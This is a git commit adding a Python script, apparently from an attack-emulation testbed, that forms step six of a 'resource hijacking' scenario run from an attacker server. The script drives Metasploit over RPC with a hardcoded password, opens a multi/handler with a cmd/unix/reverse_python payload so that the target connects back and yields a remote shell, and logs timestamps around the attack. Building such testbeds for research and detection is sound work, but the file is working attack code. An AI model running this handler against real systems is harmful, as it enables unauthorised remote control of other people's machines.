33055890122540cb7050ffa185f47afe0cff5068
AlexHchs <88889955+AlexHchs@users.noreply.github.com>
2022-03-02 18:44:48 +0800

    Add files via upload

---
+++ CREME_backend_execution/scripts/02_Scenario/04_resource_hijacking/python_files/attacker_server/6th_step_ResourceHijacking.py
@@ -0,0 +1,42 @@
+import time
+import sys
+import os
+from pymetasploit3.msfrpc import MsfRpcClient
+
+
+def record_timestamp(folder, output_time_file):
+    output_time_file = os.path.join(folder, output_time_file)
+    with open(output_time_file, "w+") as fw:
+        fw.write('%f' % time.time())
+
+
+def main(argv):
+    if len(argv) != 4:
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
+
+    folder = argv[1]
+    my_ip = argv[2]
+    target_ip = argv[3]
+
+    client = MsfRpcClient('kali')
+
+    exploit = client.modules.use('exploit', 'multi/handler')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    payload['LHOST'] = my_ip
+
+    time.sleep(2)
+    output_time_file = 'time_stage_6_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+
+    exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    time.sleep(10)
+    output_time_file = 'time_stage_6_end.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+
+main(sys.argv)
